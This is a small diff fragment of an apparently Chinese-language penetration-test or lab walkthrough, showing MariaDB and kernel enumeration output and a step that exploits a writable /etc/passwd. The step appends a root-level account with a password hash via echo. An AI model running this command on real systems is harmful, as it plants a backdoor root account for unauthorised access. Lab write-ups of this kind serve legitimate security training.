@@ -24,7 +24,6 @@ mysql  Ver 15.1 Distrib 5.5.44-MariaDB, for Linux (x86_64) using readline 5.1
 8.查看/etc/passwd權限可以修改,利用echo 添加帳號密碼登入
 
 echo 'jimmy:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> /etc/passwd
-
 [-] Kernel information:
 Linux leftturn.thinc 3.10.0-327.4.5.el7.x86_64 #1 SMP Mon Jan 25 22:07:14 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 
